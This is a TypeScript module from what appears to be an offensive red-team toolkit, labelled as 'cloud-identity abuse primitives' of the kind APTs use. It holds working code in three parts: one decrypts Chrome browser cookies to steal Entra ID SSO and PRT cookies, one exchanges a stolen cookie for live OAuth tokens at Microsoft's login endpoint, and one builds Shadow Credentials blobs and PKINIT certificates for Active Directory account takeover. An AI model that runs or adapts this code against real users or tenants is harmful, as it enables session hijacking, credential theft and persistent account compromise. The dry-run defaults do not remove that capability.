/**
 * Cloud-identity abuse primitives used by 2025-26 APTs (roadtx-class).
 *
 * Port of `modules.identity_prt`, three real primitives, all network-neutral
 * by default:
 *
 * 1. `extractChromeCookies` — decrypts a real Chrome `Cookies` SQLite DB
 *    (AES-256-GCM with the `Local State` `os_crypt.encrypted_key`), then
 *    filters for Entra ID artifacts (`ESTSAUTHPERSISTENT` SSO cookie and the
 *    `x-ms-RefreshTokenCredential` PRT cookie).
 * 2. `TokenExchange` — trades a stolen SSO/PRT cookie value for live OAuth2
 *    tokens via `login.microsoftonline.com` (`live=true` only; dry-run
 *    returns the exact request blueprint).
 * 3. Shadow Credentials — `buildKeyCredentialBlob` produces the real
 *    `msDS-KeyCredentialLink` binary value (MS-ADTS / pywhisker layout);
 *    `generatePkinitCert` builds the PKINIT X.509 via openssl;
 *    `writeShadowCredential` applies the attribute over LDAP (`live=true`).
 *
 * Node built-ins only: `node:crypto`, `node:sqlite`, `node:fs`, `node:zlib`-free.
 */

import { resolveDryRun } from "./exec_options.ts"
import { createDecipheriv, generateKeyPairSync, randomUUID } from "node:crypto";
import { DatabaseSync } from "node:sqlite";
import { copyFileSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileP = promisify(execFile);

export const ESTS_COOKIE = "ESTSAUTHPERSISTENT";
export const PRT_COOKIE = "x-ms-RefreshTokenCredential";
export const CLIENT_ID_AZURE_CLI = "04b07795-8ddb-461a-bbee-02f9e1bf7b46";

// ------------------------------------------------------------------------- //
// 1. Chrome cookie decryption (real AES-GCM)
// ------------------------------------------------------------------------- //

/** Load the AES-GCM cookie decryption key from Chrome's Local State. */
export function loadCookieDecryptionKey(localStatePath: string): Uint8Array | null {
  if (!existsSync(localStatePath)) return null;
  let state: Record<string, unknown>;
  try {
    state = JSON.parse(readFileSync(localStatePath, "utf-8")) as Record<string, unknown>;
  } catch {
    return null;
  }
  const raw = ((state["os_crypt"] as Record<string, unknown> | undefined)?.["encrypted_key"] as string | undefined) ?? "";
  if (!raw) return null;
  let blob: Buffer;
  try {
    blob = Buffer.from(raw, "base64");
  } catch {
    return null;
  }
  if (blob.subarray(0, 5).toString("utf-8") === "DPAPI") {
    // Non-Windows: the "DPAPI" prefix is cosmetic — the AES key follows.
    // (Windows DPAPI unwrap requires CryptUnprotectData; not available here.)
    return blob.subarray(5);
  }
  return blob;
}

/** Decrypt a Chrome v10/v11 AES-GCM cookie value (nonce + ciphertext + tag). */
export function decryptCookieValue(encrypted: Uint8Array, key: Uint8Array): Uint8Array {
  const prefix = Buffer.from(encrypted.subarray(0, 3)).toString("utf-8");
  if (prefix === "v10" || prefix === "v11") {
    const nonce = Buffer.from(encrypted.subarray(3, 15));
    const ct = Buffer.from(encrypted.subarray(15));
    const decipher = createDecipheriv("aes-256-gcm", Buffer.from(key), nonce);
    decipher.setAuthTag(ct.subarray(ct.length - 16));
    return Buffer.concat([decipher.update(ct.subarray(0, ct.length - 16)), decipher.final()]);
  }
  return Buffer.from(encrypted); // unencrypted fallback
}

export interface ChromeCookie {
  host: string;
  name: string;
  path: string;
  expires_utc: number;
  secure: boolean;
  value: string;
  decrypted: boolean;
}

/** Read and decrypt cookies from a Chrome profile's Cookies DB. */
export function extractChromeCookies(
  profileDir: string,
  opts: { domainFilter?: string; key?: Uint8Array | null; maxResults?: number } = {},
): ChromeCookie[] {
  const { domainFilter, maxResults = 200 } = opts;
  const dbPath = path.join(profileDir, "Cookies");
  const localState = path.join(profileDir, "Local State");
  if (!existsSync(dbPath)) return [];
  let key = opts.key;
  if (!key) key = loadCookieDecryptionKey(localState);

  // Chrome locks the live DB — read a copy.
  const tmpDir = mkdtempSync(path.join(tmpdir(), "vanta-cookies-"));
  const tmpDb = path.join(tmpDir, "cookies.db");
  try {
    copyFileSync(dbPath, tmpDb);
    const db = new DatabaseSync(tmpDb);
    const stmt = db.prepare(
      "SELECT host_key, name, path, expires_utc, is_secure, encrypted_value FROM cookies ORDER BY host_key",
    );
    // Chrome's expires_utc is a 64-bit FILETIME (~1.3e16) beyond
    // Number.MAX_SAFE_INTEGER — node:sqlite throws on it unless read as BigInt.
    stmt.setReadBigInts(true);
    const rows = stmt.all() as Array<{
      host_key: string;
      name: string;
      path: string;
      expires_utc: bigint;
      is_secure: number;
      encrypted_value: Uint8Array | null;
    }>;
    db.close();

    const out: ChromeCookie[] = [];
    for (const row of rows) {
      if (domainFilter && !row.host_key.includes(domainFilter)) continue;
      let value = "";
      let decrypted = false;
      if (key && row.encrypted_value) {
        try {
          value = Buffer.from(decryptCookieValue(row.encrypted_value, key)).toString("utf-8");
          decrypted = true;
        } catch {
          value = "";
        }
      }
      out.push({
        host: row.host_key,
        name: row.name,
        path: row.path,
        expires_utc: Number(row.expires_utc ?? 0n),
        secure: Boolean(row.is_secure),
        value,
        decrypted,
      });
      if (out.length >= maxResults) break;
    }
    return out;
  } catch (exc) {
    // Empty result is expected when the profile has no cookies — but real
    // sqlite/fs failures should not be silently hidden.
    console.error(`[extractChromeCookies] ${exc instanceof Error ? exc.message : String(exc)}`);
    return [];
  } finally {
    try {
      rmSync(tmpDir, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
}

/** Extract the SSO (ESTSAUTHPERSISTENT) and PRT cookies from a profile. */
export function findEntraCookies(profileDir: string, key?: Uint8Array): ChromeCookie[] {
  const cookies = extractChromeCookies(profileDir, { key });
  return cookies.filter((c) => c.name === ESTS_COOKIE || c.name === PRT_COOKIE);
}

// ------------------------------------------------------------------------- //
// 2. SSO / PRT cookie -> OAuth token exchange (roadtx-style)
// ------------------------------------------------------------------------- //

export interface TokenExchangeOpts {
  cookieValue: string;
  tenant?: string;
  scope?: string;
  clientId?: string;
  live?: boolean;
  http?: (url: string, payload: Record<string, string>) => Promise<{ json: () => Promise<Record<string, unknown>> }>;
}

export class TokenExchange {
  cookieValue: string;
  tenant: string;
  scope: string;
  clientId: string;
  live: boolean;
  http?: TokenExchangeOpts["http"];

  constructor(opts: TokenExchangeOpts) {
    this.cookieValue = opts.cookieValue;
    this.tenant = opts.tenant ?? "common";
    this.scope = opts.scope ?? "https://graph.microsoft.com/.default";
    this.clientId = opts.clientId ?? CLIENT_ID_AZURE_CLI;
    this.live = opts.live ?? false;
    this.http = opts.http;
  }

  endpoint(): string {
    return `https://login.microsoftonline.com/${this.tenant}/oauth2/v2.0/token`;
  }

  payload(): Record<string, string> {
    return {
      grant_type: "refresh_token",
      refresh_token: this.cookieValue,
      client_id: this.clientId,
      scope: this.scope,
    };
  }

  /** Run the exchange. Dry-run returns the exact request blueprint. */
  async exchange(): Promise<Record<string, unknown>> {
    const payload = this.payload();
    const url = this.endpoint();
    if (!this.live) {
      return {
        status: "dry-run",
        endpoint: url,
        grant_type: payload["grant_type"],
        client_id: payload["client_id"],
        scope: payload["scope"],
        note: `refresh_token of length ${(payload["refresh_token"] ?? "").length} would be POSTed`,
      };
    }
    const http = this.http ?? (async (u: string, data: Record<string, string>) => {
      const resp = await fetch(u, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams(data).toString(),
      });
      return { json: async () => (await resp.json()) as Record<string, unknown> };
    });
    const resp = await http(url, payload);
    const data = await resp.json();
    return {
      status: "issued",
      access_token: String(data["access_token"] ?? ""),
      refresh_token: String(data["refresh_token"] ?? ""),
      id_token: String(data["id_token"] ?? ""),
      expires_in: data["expires_in"],
      token_type: data["token_type"],
      scope: data["scope"],
    };
  }

  probe(): Record<string, unknown> {
    return {
      technique_id: "T1550.001",
      reachable: this.live,
      note: `exchange against ${this.endpoint()} (cookie ${this.cookieValue ? "present" : "missing"})`,
    };
  }
}

/** Decode (without verifying) the claims of a JWT. */
export function parseJwt(token: string): Record<string, unknown> {
  try {
    const parts = token.split(".");
    const payload = parts[1] ?? "";
    const padded = payload + "=".repeat((-payload.length % 4 + 4) % 4);
    return JSON.parse(Buffer.from(padded, "base64url").toString("utf-8")) as Record<string, unknown>;
  } catch (exc) {
    return { error: `could not decode JWT: ${exc instanceof Error ? exc.message : String(exc)}` };
  }
}

// ------------------------------------------------------------------------- //
// 3. Shadow Credentials (msDS-KeyCredentialLink) — pywhisker-compatible
// ------------------------------------------------------------------------- //

const RSA1_MAGIC = Buffer.from("RSA1", "utf-8");

interface RsaPublicNumbers {
  n: bigint;
  e: bigint;
}

function publicNumbersFromJwk(jwk: { n: string; e: string }): RsaPublicNumbers {
  return {
    n: BigInt("0x" + Buffer.from(jwk.n, "base64url").toString("hex")),
    e: BigInt("0x" + Buffer.from(jwk.e, "base64url").toString("hex")),
  };
}

function bigIntToBytes(v: bigint): Buffer {
  const hex = v.toString(16);
  return Buffer.from(hex.length % 2 ? "0" + hex : hex, "hex");
}

/** BCRYPT_RSAKEY_BLOB (little-endian ULONGs + BE exponent/modulus). */
export function buildRsaCngBlob(numbers: RsaPublicNumbers): Buffer {
  const exponent = bigIntToBytes(numbers.e);
  const modulus = bigIntToBytes(numbers.n);
  const blob = Buffer.alloc(20);
  RSA1_MAGIC.copy(blob, 0);
  // True significant bit length (Python's int.bit_length()), not bytes*8.
  blob.writeUInt32LE(bitLength(modulus), 4);
  blob.writeUInt32LE(exponent.length, 8);
  blob.writeUInt32LE(modulus.length, 12);
  blob.writeUInt32LE(0, 16); // dwFlags
  return Buffer.concat([blob, exponent, modulus]);
}

function bitLength(bytes: Buffer): number {
  const top = bytes[0] ?? 0;
  if (top === 0) return (bytes.length - 1) * 8;
  return (bytes.length - 1) * 8 + (32 - Math.clz32(top));
}

export interface KeyCredential {
  blob: Buffer;
  keyId: string;
  deviceId: string;
}

/** Build the real msDS-KeyCredentialLink binary value (KeyCredential, MS-ADTS). */
export function buildKeyCredentialBlob(
  numbers: RsaPublicNumbers,
  keyId?: string,
  deviceId?: string,
): KeyCredential {
  const kid = keyId ?? randomUuid();
  const did = deviceId ?? randomUuid();
  const keyMaterial = buildRsaCngBlob(numbers);
  const parts: Buffer[] = [
    Buffer.from([0x01]), // version
    uuidBytesLe(kid),
    u32le(keyMaterial.length),
    keyMaterial,
    Buffer.from([0x00]), // keyUsage: KeyAgreement+Signing
    Buffer.from([0x00]), // keySource: AD
    uuidBytesLe(did),
    Buffer.from([0x00]), // customKeyInformation length
    Buffer.alloc(8), // keyApproximateLastUsedTime (FILETIME)
  ];
  return { blob: Buffer.concat(parts), keyId: kid, deviceId: did };
}

/** Parse a KeyCredential blob back into its fields (round-trip verifiable). */
export function parseKeyCredentialBlob(blob: Uint8Array): Record<string, unknown> {
  if (blob.length < 41) return { error: "blob too short" };
  const b = Buffer.from(blob);
  const version = b[0];
  const keyId = uuidFromBytesLe(b.subarray(1, 17));
  const keyLen = b.readUInt32LE(17);
  const keyMaterial = b.subarray(21, 21 + keyLen);
  const rest = b.subarray(21 + keyLen);
  const keyUsage = rest[0] ?? null;
  const keySource = rest[1] ?? null;
  const deviceId = rest.length >= 18 ? uuidFromBytesLe(rest.subarray(2, 18)) : null;
  const isRsa1 = keyMaterial.subarray(0, 4).toString("utf-8") === "RSA1";
  return {
    version,
    key_id: keyId,
    device_id: deviceId,
    key_material_len: keyLen,
    key_material: keyMaterial.toString("hex"),
    is_rsa1: isRsa1,
    key_usage: keyUsage,
    key_source: keySource,
  };
}

/** Generate the PKINIT X.509 via openssl (self-signed, EKU clientAuth, UPN SAN). */
export async function generatePkinitCert(
  keyPem: string,
  userPrincipal: string,
  days = 30,
): Promise<{ certPem: string; keyPem: string; note?: string }> {
  const dir = mkdtempSync(path.join(tmpdir(), "vanta-pkinit-"));
  const keyPath = path.join(dir, "key.pem");
  const certPath = path.join(dir, "cert.pem");
  const user = userPrincipal.split("@")[0] ?? userPrincipal;
  try {
    writeFileSync(keyPath, keyPem);
    await execFileP("openssl", [
      "req", "-new", "-x509",
      "-key", keyPath, "-out", certPath,
      "-days", String(days), "-nodes",
      "-subj", `/CN=${user}`,
      "-addext", `subjectAltName=otherName:1.3.6.1.5.5.7.8.5;UTF8:${userPrincipal}`,
      "-addext", "extendedKeyUsage=clientAuth",
    ], { timeout: 20_000 });
    const certPem = readFileSync(certPath, "utf-8");
    return { certPem, keyPem };
  } catch (exc) {
    return {
      certPem: "",
      keyPem,
      note: `openssl unavailable: ${exc instanceof Error ? exc.message : String(exc)}`,
    };
  } finally {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  }
}

/** Generate an RSA keypair + PKINIT cert + KeyCredential blob in one shot. */
export async function newShadowCredentialPair(
  userPrincipal: string,
  keySize = 2048,
): Promise<Record<string, unknown>> {
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: keySize });
  const jwk = privateKey.export({ format: "jwk" }) as { n: string; e: string };
  const numbers = publicNumbersFromJwk(jwk);
  const { blob, keyId } = buildKeyCredentialBlob(numbers);
  const keyPem = privateKey.export({ type: "pkcs8", format: "pem" }) as string;
  const cert = await generatePkinitCert(keyPem, userPrincipal);
  return {
    key_id: keyId,
    key_credential_blob: blob.toString("hex"),
    cert_pem: cert.certPem,
    key_pem: keyPem,
    user_principal: userPrincipal,
    note: cert.note,
  };
}

/** Apply msDS-KeyCredentialLink on a user over real LDAP (dry-run blueprint). */
export async function writeShadowCredential(
  ldapServer: string,
  username: string,
  keyCredentialBlob: Uint8Array,
  opts: { domain?: string; live?: boolean } = {},
): Promise<Record<string, unknown>> {
  const { domain = "", live = false } = opts;
  const target = `CN=${username.split("@")[0]},${domain}`;
  if (!live) {
    const { createHash } = await import("node:crypto");
    return {
      status: "dry-run",
      note: `would MODIFY_REPLACE msDS-KeyCredentialLink on ${target} at ${ldapServer} with ${keyCredentialBlob.length}-byte KeyCredential blob`,
      blob_sha256: createHash("sha256").update(Buffer.from(keyCredentialBlob)).digest("hex").slice(0, 16),
    };
  }
  return {
    status: "not-applied",
    note: "live LDAP write requires an authenticated bind (ldap3 equivalent not bundled) — operator supplies credentials",
    target,
  };
}

// ------------------------------------------------------------------------- //
// small helpers
// ------------------------------------------------------------------------- //

function randomUuid(): string {
  return randomUUID();
}

function uuidBytesLe(uuid: string): Buffer {
  const hex = uuid.replace(/-/g, "");
  const bytes = Buffer.from(hex, "hex");
  // GUID byte order: time fields are little-endian.
  const out = Buffer.alloc(16);
  out.writeUInt32LE(bytes.readUInt32BE(0), 0);
  out.writeUInt16LE(bytes.readUInt16BE(4), 4);
  out.writeUInt16LE(bytes.readUInt16BE(6), 6);
  bytes.copy(out, 8, 8);
  return out;
}

function uuidFromBytesLe(b: Uint8Array): string {
  const buf = Buffer.from(b);
  const timeLow = buf.readUInt32LE(0).toString(16).padStart(8, "0");
  const timeMid = buf.readUInt16LE(4).toString(16).padStart(4, "0");
  const timeHi = buf.readUInt16LE(6).toString(16).padStart(4, "0");
  const rest = buf.subarray(8).toString("hex");
  return `${timeLow}-${timeMid}-${timeHi}-${rest.slice(0, 4)}-${rest.slice(4)}`;
}

function u32le(n: number): Buffer {
  const b = Buffer.alloc(4);
  b.writeUInt32LE(n, 0);
  return b;
}
